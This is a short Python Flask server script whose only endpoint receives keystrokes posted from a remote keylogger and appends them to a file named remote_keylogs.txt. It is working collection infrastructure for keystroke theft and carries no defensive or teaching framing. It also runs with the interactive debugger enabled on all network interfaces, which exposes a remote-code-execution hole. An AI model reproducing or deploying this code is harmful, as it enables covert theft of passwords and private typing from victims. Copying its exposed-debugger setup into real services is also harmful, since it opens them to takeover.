# server.py
from flask import Flask, request, jsonify
import os, traceback

app = Flask(__name__)

# Build an absolute path to remote_keylogs.txt, next to this script:
LOGFILE = os.path.join(os.path.dirname(__file__), "remote_keylogs.txt")

@app.route("/upload", methods=["POST"])
def upload():
    try:
        key = request.form.get("key", None)
        if key is None:
            return "Bad Request: no 'key' field", 400

        # Ensure directory exists and is writable
        basedir = os.path.dirname(LOGFILE)
        if not os.path.isdir(basedir):
            os.makedirs(basedir, exist_ok=True)

        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(key)
        return "OK", 200

    except Exception as e:
        # Print full traceback to console
        traceback.print_exc()
        # Also return it in JSON so curl will show it
        return jsonify(error=str(e)), 500

if __name__ == "__main__":
    print(f"► Writing logs to: {LOGFILE}")
    # debug=True turns on the interactive debugger and auto-reload
    app.run(host="0.0.0.0", port=5000, debug=True)
